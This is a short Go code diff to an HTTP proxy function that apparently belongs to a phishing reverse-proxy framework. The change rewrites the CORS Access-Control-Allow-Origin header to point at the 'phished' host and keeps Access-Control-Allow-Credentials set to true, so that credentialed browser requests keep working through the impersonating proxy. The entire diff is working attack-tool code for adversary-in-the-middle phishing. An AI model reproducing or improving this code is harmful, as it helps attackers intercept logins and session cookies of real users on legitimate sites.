@@ -607,7 +607,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" {
-				resp.Header.Set("Access-Control-Allow-Origin", "*")
+				if allow_origin != "*" {
+					if u, err := url.Parse(allow_origin); err == nil {
+						if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
+							resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
+						}
+					} else {
+						log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
+						resp.Header.Set("Access-Control-Allow-Origin", "*")
+					}
+				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
 			var rm_headers = []string{
